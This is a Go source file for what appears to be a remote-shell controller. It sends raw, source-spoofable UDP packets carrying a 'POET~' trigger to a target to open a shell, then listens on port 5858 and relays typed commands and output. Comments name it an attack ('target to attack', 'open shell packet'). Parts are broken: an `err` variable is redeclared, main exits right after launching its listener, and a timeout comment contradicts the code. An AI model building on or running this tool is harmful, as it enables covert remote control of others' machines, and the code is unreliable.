package main

import (
	"flag"
	"fmt"
	"net"
	"os"
	"syscall"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

const (
	CONN_PORT = "5858"
	CONN_TYPE = "udp"
)

// Handles incoming requests.
func handleRequest(conn net.PacketConn) {
	var buf []byte

	for {
		// Make a buffer to hold incoming data.
		buf = make([]byte, 1024)                               // TODO flush buffer each time
		conn.SetReadDeadline(time.Now().Add(60 * time.Second)) // 30 second wait time
		// Read the incoming connection into the buffer.
		nRead, addr, err := conn.ReadFrom(buf)
		if err != nil {
			fmt.Println("Error reading:", err.Error())
		}
		fmt.Printf("%d", nRead)

		var input string
		fmt.Scanf("%s", &input) // get command input

		if input == "exit" {
			return
		}

		conn.WriteTo([]byte(input), addr)
	}

	// Send a response back to person contacting us.
	//   conn.Write([]byte(command))
	// Close the connection when you're done with it.
	// conn.Close()
}

func open(ifName string) (net.PacketConn, error) {
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	if err != nil {
		return nil, fmt.Errorf("Failed open socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW): %s", err)
	}
	syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)

	if ifName != "" {
		_, err := net.InterfaceByName(ifName)
		if err != nil {
			return nil, fmt.Errorf("Failed to find interface: %s: %s", ifName, err)
		}
		syscall.SetsockoptString(fd, syscall.SOL_SOCKET, syscall.SO_BINDTODEVICE, ifName)
	}

	conn, err := net.FilePacketConn(os.NewFile(uintptr(fd), fmt.Sprintf("fd %d", fd)))
	if err != nil {
		return nil, err
	}
	return conn, nil
}

func buildUDPPacket(dst, src *net.UDPAddr, command string) ([]byte, error) {
	buffer := gopacket.NewSerializeBuffer()
	payload := gopacket.Payload(command)
	ip := &layers.IPv4{
		DstIP:    dst.IP,
		SrcIP:    src.IP,
		Version:  4,
		TTL:      64,
		Protocol: layers.IPProtocolUDP,
	}
	udp := &layers.UDP{
		SrcPort: layers.UDPPort(src.Port),
		DstPort: layers.UDPPort(dst.Port),
	}
	if err := udp.SetNetworkLayerForChecksum(ip); err != nil {
		return nil, fmt.Errorf("Failed calc checksum: %s", err)
	}
	if err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{ComputeChecksums: true, FixLengths: true}, ip, udp, payload); err != nil {
		return nil, fmt.Errorf("Failed serialize packet: %s", err)
	}
	return buffer.Bytes(), nil
}

func sendUDPPacket(iFace string, target string, command string) {
	conn, err := open(iFace)
	if err != nil {
		panic(err)
	}
	dst := &net.UDPAddr{
		IP:   net.ParseIP(target),
		Port: 7714,
	}
	b, err := buildUDPPacket(dst, &net.UDPAddr{IP: net.ParseIP(target), Port: 77}, command)
	if err != nil {
		panic(err)
	}
	_, err := conn.WriteTo(b, &net.IPAddr{IP: dst.IP})
	if err != nil {
		panic(err)
	}
}

func main() {
	/*
		1. start binary w/ correct args
		2. prompt for target to hit, send custom UDP packet with source IP
		3. listening in background on 0.0.0.0:5858 for connection //TODO change port
		4. print data from target (ex. prompt or output)
		5. send commands with custom build udp packet
		6. exit command to kill full process
	*/
	var iFace string
	var source string

	flag.StringVar(&source, "s", "127.0.0.1", "REQUIRED: source IP to listen on")
	// flag.StringVar(&command, "c", "default", "REQUIRED: command to execute on source")

	flag.Parse()

	if source == "127.0.0.1" {
		flag.Usage()
		return
	}

	iFace, ok := os.LookupEnv("IFACE")
	if !ok {
		fmt.Printf("IFACE environment variable not set\n")
		return
	}

	// prompt here for target to attack
	// send POET udp open shell packet w/ IP
	var target string
	fmt.Scanf("Target: %s", &target)
	opener := "POET~" + target
	sendUDPPacket(iFace, target, opener)

	pc, err := net.ListenPacket("udp", source+":"+CONN_PORT)
	if err != nil {
		return
	}
	// `Close`ing the packet "connection" means cleaning the data structures
	// allocated for holding information about the listening socket.
	defer pc.Close()

	// Handle connections in a new goroutine.
	go handleRequest(pc)
}
